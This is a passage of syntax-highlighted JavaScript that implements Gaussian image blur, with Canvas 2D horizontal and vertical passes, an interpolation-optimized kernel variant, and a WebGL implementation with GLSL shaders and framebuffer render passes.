        } <span class="hljs-keyword">else</span> {
          optimized.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">offset</span>: i - radius, <span class="hljs-attr">weight</span>: kernel[i] });
        }
      }
      <span class="hljs-keyword">return</span> optimized;
    }

    <span class="hljs-comment">// ==================== Canvas 2D å®ç° ====================</span>

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">blurHorizontal</span>(<span class="hljs-params">imageData, kernel, radius</span>) {
      <span class="hljs-keyword">const</span> { width, height, data } = imageData;
      <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
          <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>, g = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, a = <span class="hljs-number">0</span>;
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> kx = -radius; kx &lt;= radius; kx++) {
            <span class="hljs-keyword">const</span> px = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x + kx, <span class="hljs-number">0</span>), width - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> idx = (y * width + px) * <span class="hljs-number">4</span>;
            <span class="hljs-keyword">const</span> weight = kernel[kx + radius];
            r += data[idx] * weight;
            g += data[idx + <span class="hljs-number">1</span>] * weight;
            b += data[idx + <span class="hljs-number">2</span>] * weight;
            a += data[idx + <span class="hljs-number">3</span>] * weight;
          }
          <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
          output[outIdx] = r;
          output[outIdx + <span class="hljs-number">1</span>] = g;
          output[outIdx + <span class="hljs-number">2</span>] = b;
          output[outIdx + <span class="hljs-number">3</span>] = a;
        }
      }
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">blurVertical</span>(<span class="hljs-params">imageData, kernel, radius</span>) {
      <span class="hljs-keyword">const</span> { width, height, data } = imageData;
      <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
          <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>, g = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, a = <span class="hljs-number">0</span>;
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> ky = -radius; ky &lt;= radius; ky++) {
            <span class="hljs-keyword">const</span> py = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(y + ky, <span class="hljs-number">0</span>), height - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> idx = (py * width + x) * <span class="hljs-number">4</span>;
            <span class="hljs-keyword">const</span> weight = kernel[ky + radius];
            r += data[idx] * weight;
            g += data[idx + <span class="hljs-number">1</span>] * weight;
            b += data[idx + <span class="hljs-number">2</span>] * weight;
            a += data[idx + <span class="hljs-number">3</span>] * weight;
          }
          <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
          output[outIdx] = r;
          output[outIdx + <span class="hljs-number">1</span>] = g;
          output[outIdx + <span class="hljs-number">2</span>] = b;
          output[outIdx + <span class="hljs-number">3</span>] = a;
        }
      }
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">blurHorizontalOptimized</span>(<span class="hljs-params">imageData, optimized</span>) {
      <span class="hljs-keyword">const</span> { width, height, data } = imageData;
      <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
          <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>, g = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, a = <span class="hljs-number">0</span>;
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> { offset, weight } <span class="hljs-keyword">of</span> optimized) {
            <span class="hljs-keyword">const</span> samplePos = x + offset;
            <span class="hljs-keyword">const</span> px1 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(samplePos);
            <span class="hljs-keyword">const</span> px2 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(samplePos);
            <span class="hljs-keyword">const</span> frac = samplePos - px1;
            <span class="hljs-keyword">const</span> px1Clamped = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(px1, <span class="hljs-number">0</span>), width - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> px2Clamped = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(px2, <span class="hljs-number">0</span>), width - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> idx1 = (y * width + px1Clamped) * <span class="hljs-number">4</span>;
            <span class="hljs-keyword">const</span> idx2 = (y * width + px2Clamped) * <span class="hljs-number">4</span>;
            <span class="hljs-keyword">const</span> sr = data[idx1] * (<span class="hljs-number">1</span> - frac) + data[idx2] * frac;
            <span class="hljs-keyword">const</span> sg = data[idx1 + <span class="hljs-number">1</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">1</span>] * frac;
            <span class="hljs-keyword">const</span> sb = data[idx1 + <span class="hljs-number">2</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">2</span>] * frac;
            <span class="hljs-keyword">const</span> sa = data[idx1 + <span class="hljs-number">3</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">3</span>] * frac;
            r += sr * weight;
            g += sg * weight;
            b += sb * weight;
            a += sa * weight;
          }
          <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
          output[outIdx] = r;
          output[outIdx + <span class="hljs-number">1</span>] = g;
          output[outIdx + <span class="hljs-number">2</span>] = b;
          output[outIdx + <span class="hljs-number">3</span>] = a;
        }
      }
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">blurVerticalOptimized</span>(<span class="hljs-params">imageData, optimized</span>) {
      <span class="hljs-keyword">const</span> { width, height, data } = imageData;
      <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
          <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>, g = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, a = <span class="hljs-number">0</span>;
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> { offset, weight } <span class="hljs-keyword">of</span> optimized) {
            <span class="hljs-keyword">const</span> samplePos = y + offset;
            <span class="hljs-keyword">const</span> py1 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(samplePos);
            <span class="hljs-keyword">const</span> py2 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(samplePos);
            <span class="hljs-keyword">const</span> frac = samplePos - py1;
            <span class="hljs-keyword">const</span> py1Clamped = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(py1, <span class="hljs-number">0</span>), height - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> py2Clamped = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(py2, <span class="hljs-number">0</span>), height - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> idx1 = (py1Clamped * width + x) * <span class="hljs-number">4</span>;
            <span class="hljs-keyword">const</span> idx2 = (py2Clamped * width + x) * <span class="hljs-number">4</span>;
            <span class="hljs-keyword">const</span> sr = data[idx1] * (<span class="hljs-number">1</span> - frac) + data[idx2] * frac;
            <span class="hljs-keyword">const</span> sg = data[idx1 + <span class="hljs-number">1</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">1</span>] * frac;
            <span class="hljs-keyword">const</span> sb = data[idx1 + <span class="hljs-number">2</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">2</span>] * frac;
            <span class="hljs-keyword">const</span> sa = data[idx1 + <span class="hljs-number">3</span>] * (<span class="hljs-number">1</span> - frac) + data[idx2 + <span class="hljs-number">3</span>] * frac;
            r += sr * weight;
            g += sg * weight;
            b += sb * weight;
            a += sa * weight;
          }
          <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
          output[outIdx] = r;
          output[outIdx + <span class="hljs-number">1</span>] = g;
          output[outIdx + <span class="hljs-number">2</span>] = b;
          output[outIdx + <span class="hljs-number">3</span>] = a;
        }
      }
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
    }

    <span class="hljs-comment">// ==================== WebGL å®ç° ====================</span>

    <span class="hljs-keyword">const</span> vertexShaderSource = <span class="hljs-string">`
      attribute vec2 a_position;
      attribute vec2 a_texCoord;
      varying vec2 v_texCoord;
      void main() {
        gl_Position = vec4(a_position, 0.0, 1.0);
        v_texCoord = a_texCoord;
      }
    `</span>;

    <span class="hljs-keyword">const</span> traditionalHorizontalShader = <span class="hljs-string">`
      precision mediump float;
      uniform sampler2D u_texture;
      uniform float u_texelSize;
      uniform float u_kernel[63];
      uniform int u_radius;
      varying vec2 v_texCoord;
      void main() {
        vec4 color = vec4(0.0);
        for (int i = -31; i &lt;= 31; i++) {
          int absI = i &lt; 0 ? -i : i;
          if (absI &gt; u_radius) continue;
          float weight = u_kernel[i + 31];
          vec2 offset = vec2(float(i) * u_texelSize, 0.0);
          color += texture2D(u_texture, v_texCoord + offset) * weight;
        }
        gl_FragColor = color;
      }
    `</span>;

    <span class="hljs-keyword">const</span> traditionalVerticalShader = <span class="hljs-string">`
      precision mediump float;
      uniform sampler2D u_texture;
      uniform float u_texelSize;
      uniform float u_kernel[63];
      uniform int u_radius;
      varying vec2 v_texCoord;
      void main() {
        vec4 color = vec4(0.0);
        for (int i = -31; i &lt;= 31; i++) {
          int absI = i &lt; 0 ? -i : i;
          if (absI &gt; u_radius) continue;
          float weight = u_kernel[i + 31];
          vec2 offset = vec2(0.0, float(i) * u_texelSize);
          color += texture2D(u_texture, v_texCoord + offset) * weight;
        }
        gl_FragColor = color;
      }
    `</span>;

    <span class="hljs-keyword">const</span> optimizedHorizontalShader = <span class="hljs-string">`
      precision mediump float;
      uniform sampler2D u_texture;
      uniform float u_texelSize;
      uniform float u_offsets[32];
      uniform float u_weights[32];
      uniform int u_sampleCount;
      varying vec2 v_texCoord;
      void main() {
        vec4 color = vec4(0.0);
        for (int i = 0; i &lt; 32; i++) {
          if (i &gt;= u_sampleCount) break;
          float offset = u_offsets[i];
          float weight = u_weights[i];
          vec2 tc = vec2(v_texCoord.x + offset * u_texelSize, v_texCoord.y);
          color += texture2D(u_texture, tc) * weight;
        }
        gl_FragColor = color;
      }
    `</span>;

    <span class="hljs-keyword">const</span> optimizedVerticalShader = <span class="hljs-string">`
      precision mediump float;
      uniform sampler2D u_texture;
      uniform float u_texelSize;
      uniform float u_offsets[32];
      uniform float u_weights[32];
      uniform int u_sampleCount;
      varying vec2 v_texCoord;
      void main() {
        vec4 color = vec4(0.0);
        for (int i = 0; i &lt; 32; i++) {
          if (i &gt;= u_sampleCount) break;
          float offset = u_offsets[i];
          float weight = u_weights[i];
          vec2 tc = vec2(v_texCoord.x, v_texCoord.y + offset * u_texelSize);
          color += texture2D(u_texture, tc) * weight;
        }
        gl_FragColor = color;
      }
    `</span>;

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">createShader</span>(<span class="hljs-params">gl, type, source</span>) {
      <span class="hljs-keyword">const</span> shader = gl.<span class="hljs-title function_">createShader</span>(type);
      gl.<span class="hljs-title function_">shaderSource</span>(shader, source);
      gl.<span class="hljs-title function_">compileShader</span>(shader);
      <span class="hljs-keyword">if</span> (!gl.<span class="hljs-title function_">getShaderParameter</span>(shader, gl.<span class="hljs-property">COMPILE_STATUS</span>)) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Shader error:'</span>, gl.<span class="hljs-title function_">getShaderInfoLog</span>(shader));
        gl.<span class="hljs-title function_">deleteShader</span>(shader);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
      }
      <span class="hljs-keyword">return</span> shader;
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">createProgram</span>(<span class="hljs-params">gl, vs, fs</span>) {
      <span class="hljs-keyword">const</span> program = gl.<span class="hljs-title function_">createProgram</span>();
      gl.<span class="hljs-title function_">attachShader</span>(program, vs);
      gl.<span class="hljs-title function_">attachShader</span>(program, fs);
      gl.<span class="hljs-title function_">linkProgram</span>(program);
      <span class="hljs-keyword">if</span> (!gl.<span class="hljs-title function_">getProgramParameter</span>(program, gl.<span class="hljs-property">LINK_STATUS</span>)) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Program error:'</span>, gl.<span class="hljs-title function_">getProgramInfoLog</span>(program));
        gl.<span class="hljs-title function_">deleteProgram</span>(program);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
      }
      <span class="hljs-keyword">return</span> program;
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setupQuad</span>(<span class="hljs-params">gl</span>) {
      <span class="hljs-keyword">const</span> positions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>([-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>,-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>,<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>,<span class="hljs-number">1</span>, <span class="hljs-number">1</span>,-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);
      <span class="hljs-keyword">const</span> texCoords = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, <span class="hljs-number">0</span>,<span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>]);
      <span class="hljs-keyword">const</span> positionBuffer = gl.<span class="hljs-title function_">createBuffer</span>();
      gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, positionBuffer);
      gl.<span class="hljs-title function_">bufferData</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, positions, gl.<span class="hljs-property">STATIC_DRAW</span>);
      <span class="hljs-keyword">const</span> texCoordBuffer = gl.<span class="hljs-title function_">createBuffer</span>();
      gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, texCoordBuffer);
      gl.<span class="hljs-title function_">bufferData</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, texCoords, gl.<span class="hljs-property">STATIC_DRAW</span>);
      <span class="hljs-keyword">return</span> { positionBuffer, texCoordBuffer };
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadTexture</span>(<span class="hljs-params">gl, image</span>) {
      <span class="hljs-keyword">const</span> texture = gl.<span class="hljs-title function_">createTexture</span>();
      gl.<span class="hljs-title function_">bindTexture</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, texture);
      gl.<span class="hljs-title function_">texImage2D</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, <span class="hljs-number">0</span>, gl.<span class="hljs-property">RGBA</span>, gl.<span class="hljs-property">RGBA</span>, gl.<span class="hljs-property">UNSIGNED_BYTE</span>, image);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_WRAP_S</span>, gl.<span class="hljs-property">CLAMP_TO_EDGE</span>);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_WRAP_T</span>, gl.<span class="hljs-property">CLAMP_TO_EDGE</span>);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_MIN_FILTER</span>, gl.<span class="hljs-property">LINEAR</span>);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_MAG_FILTER</span>, gl.<span class="hljs-property">LINEAR</span>);
      <span class="hljs-keyword">return</span> texture;
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">createFramebuffer</span>(<span class="hljs-params">gl, w, h</span>) {
      <span class="hljs-keyword">const</span> fb = gl.<span class="hljs-title function_">createFramebuffer</span>();
      <span class="hljs-keyword">const</span> tex = gl.<span class="hljs-title function_">createTexture</span>();
      gl.<span class="hljs-title function_">bindTexture</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, tex);
      gl.<span class="hljs-title function_">texImage2D</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, <span class="hljs-number">0</span>, gl.<span class="hljs-property">RGBA</span>, w, h, <span class="hljs-number">0</span>, gl.<span class="hljs-property">RGBA</span>, gl.<span class="hljs-property">UNSIGNED_BYTE</span>, <span class="hljs-literal">null</span>);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_WRAP_S</span>, gl.<span class="hljs-property">CLAMP_TO_EDGE</span>);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_WRAP_T</span>, gl.<span class="hljs-property">CLAMP_TO_EDGE</span>);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_MIN_FILTER</span>, gl.<span class="hljs-property">LINEAR</span>);
      gl.<span class="hljs-title function_">texParameteri</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, gl.<span class="hljs-property">TEXTURE_MAG_FILTER</span>, gl.<span class="hljs-property">LINEAR</span>);
      gl.<span class="hljs-title function_">bindFramebuffer</span>(gl.<span class="hljs-property">FRAMEBUFFER</span>, fb);
      gl.<span class="hljs-title function_">framebufferTexture2D</span>(gl.<span class="hljs-property">FRAMEBUFFER</span>, gl.<span class="hljs-property">COLOR_ATTACHMENT0</span>, gl.<span class="hljs-property">TEXTURE_2D</span>, tex, <span class="hljs-number">0</span>);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">framebuffer</span>: fb, <span class="hljs-attr">texture</span>: tex };
    }

    <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebGLBlur</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">canvas</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = canvas;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span> = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'webgl'</span>, { <span class="hljs-attr">preserveDrawingBuffer</span>: <span class="hljs-literal">true</span> });
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'WebGL not supported'</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupPrograms</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">quad</span> = <span class="hljs-title function_">setupQuad</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span>);
      }

      <span class="hljs-title function_">setupPrograms</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> gl = <span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span>;
        <span class="hljs-keyword">const</span> vs = <span class="hljs-title function_">createShader</span>(gl, gl.<span class="hljs-property">VERTEX_SHADER</span>, vertexShaderSource);
        <span class="hljs-keyword">const</span> tradH = <span class="hljs-title function_">createShader</span>(gl, gl.<span class="hljs-property">FRAGMENT_SHADER</span>, traditionalHorizontalShader);
        <span class="hljs-keyword">const</span> tradV = <span class="hljs-title function_">createShader</span>(gl, gl.<span class="hljs-property">FRAGMENT_SHADER</span>, traditionalVerticalShader);
        <span class="hljs-keyword">const</span> optH = <span class="hljs-title function_">createShader</span>(gl, gl.<span class="hljs-property">FRAGMENT_SHADER</span>, optimizedHorizontalShader);
        <span class="hljs-keyword">const</span> optV = <span class="hljs-title function_">createShader</span>(gl, gl.<span class="hljs-property">FRAGMENT_SHADER</span>, optimizedVerticalShader);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">traditionalHProgram</span> = <span class="hljs-title function_">createProgram</span>(gl, vs, tradH);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">traditionalVProgram</span> = <span class="hljs-title function_">createProgram</span>(gl, vs, tradV);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">optimizedHProgram</span> = <span class="hljs-title function_">createProgram</span>(gl, vs, optH);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">optimizedVProgram</span> = <span class="hljs-title function_">createProgram</span>(gl, vs, optV);
      }

      <span class="hljs-title function_">applyTraditional</span>(<span class="hljs-params">texture, w, h, radius, sigma</span>) {
        <span class="hljs-keyword">const</span> gl = <span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span>;
        <span class="hljs-keyword">const</span> kernel = <span class="hljs-title function_">generateGaussianKernel</span>(radius, sigma);
        <span class="hljs-keyword">const</span> fb = <span class="hljs-title function_">createFramebuffer</span>(gl, w, h);
        gl.<span class="hljs-title function_">bindFramebuffer</span>(gl.<span class="hljs-property">FRAMEBUFFER</span>, fb.<span class="hljs-property">framebuffer</span>);
        gl.<span class="hljs-title function_">viewport</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, w, h);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderPass</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">traditionalHProgram</span>, texture, w, h, kernel, radius, <span class="hljs-literal">true</span>);
        gl.<span class="hljs-title function_">bindFramebuffer</span>(gl.<span class="hljs-property">FRAMEBUFFER</span>, <span class="hljs-literal">null</span>);
        gl.<span class="hljs-title function_">viewport</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, w, h);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderPass</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">traditionalVProgram</span>, fb.<span class="hljs-property">texture</span>, w, h, kernel, radius, <span class="hljs-literal">false</span>);
        gl.<span class="hljs-title function_">deleteFramebuffer</span>(fb.<span class="hljs-property">framebuffer</span>);
        gl.<span class="hljs-title function_">deleteTexture</span>(fb.<span class="hljs-property">texture</span>);
      }

      <span class="hljs-title function_">applyOptimized</span>(<span class="hljs-params">texture, w, h, radius, sigma</span>) {
        <span class="hljs-keyword">const</span> gl = <span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span>;
        <span class="hljs-keyword">const</span> kernel = <span class="hljs-title function_">generateGaussianKernel</span>(radius, sigma);
        <span class="hljs-keyword">const</span> optimized = <span class="hljs-title function_">optimizeKernel</span>(kernel);
        <span class="hljs-keyword">const</span> fb = <span class="hljs-title function_">createFramebuffer</span>(gl, w, h);
        gl.<span class="hljs-title function_">bindFramebuffer</span>(gl.<span class="hljs-property">FRAMEBUFFER</span>, fb.<span class="hljs-property">framebuffer</span>);
        gl.<span class="hljs-title function_">viewport</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, w, h);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderPassOptimized</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">optimizedHProgram</span>, texture, w, h, optimized, <span class="hljs-literal">true</span>);
        gl.<span class="hljs-title function_">bindFramebuffer</span>(gl.<span class="hljs-property">FRAMEBUFFER</span>, <span class="hljs-literal">null</span>);
        gl.<span class="hljs-title function_">viewport</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, w, h);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderPassOptimized</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">optimizedVProgram</span>, fb.<span class="hljs-property">texture</span>, w, h, optimized, <span class="hljs-literal">false</span>);
        gl.<span class="hljs-title function_">deleteFramebuffer</span>(fb.<span class="hljs-property">framebuffer</span>);
        gl.<span class="hljs-title function_">deleteTexture</span>(fb.<span class="hljs-property">texture</span>);
      }

      <span class="hljs-title function_">renderPass</span>(<span class="hljs-params">program, texture, w, h, kernel, radius, horizontal</span>) {
        <span class="hljs-keyword">const</span> gl = <span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span>;
        gl.<span class="hljs-title function_">useProgram</span>(program);
        <span class="hljs-keyword">const</span> posLoc = gl.<span class="hljs-title function_">getAttribLocation</span>(program, <span class="hljs-string">'a_position'</span>);
        <span class="hljs-keyword">const</span> texLoc = gl.<span class="hljs-title function_">getAttribLocation</span>(program, <span class="hljs-string">'a_texCoord'</span>);
        gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">quad</span>.<span class="hljs-property">positionBuffer</span>);
        gl.<span class="hljs-title function_">enableVertexAttribArray</span>(posLoc);
        gl.<span class="hljs-title function_">vertexAttribPointer</span>(posLoc, <span class="hljs-number">2</span>, gl.<span class="hljs-property">FLOAT</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">quad</span>.<span class="hljs-property">texCoordBuffer</span>);
        gl.<span class="hljs-title function_">enableVertexAttribArray</span>(texLoc);
        gl.<span class="hljs-title function_">vertexAttribPointer</span>(texLoc, <span class="hljs-number">2</span>, gl.<span class="hljs-property">FLOAT</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        gl.<span class="hljs-title function_">activeTexture</span>(gl.<span class="hljs-property">TEXTURE0</span>);
        gl.<span class="hljs-title function_">bindTexture</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, texture);
        gl.<span class="hljs-title function_">uniform1i</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_texture'</span>), <span class="hljs-number">0</span>);
        <span class="hljs-keyword">const</span> texelSize = horizontal ? <span class="hljs-number">1.0</span> / w : <span class="hljs-number">1.0</span> / h;
        gl.<span class="hljs-title function_">uniform1f</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_texelSize'</span>), texelSize);
        gl.<span class="hljs-title function_">uniform1i</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_radius'</span>), radius);
        <span class="hljs-keyword">const</span> paddedKernel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>(<span class="hljs-number">63</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernel.<span class="hljs-property">length</span>; i++) {
          paddedKernel[i + <span class="hljs-number">31</span> - radius] = kernel[i];
        }
        gl.<span class="hljs-title function_">uniform1fv</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_kernel'</span>), paddedKernel);
        gl.<span class="hljs-title function_">drawArrays</span>(gl.<span class="hljs-property">TRIANGLES</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);
      }

      <span class="hljs-title function_">renderPassOptimized</span>(<span class="hljs-params">program, texture, w, h, optimized, horizontal</span>) {
        <span class="hljs-keyword">const</span> gl = <span class="hljs-variable language_">this</span>.<span class="hljs-property">gl</span>;
        gl.<span class="hljs-title function_">useProgram</span>(program);
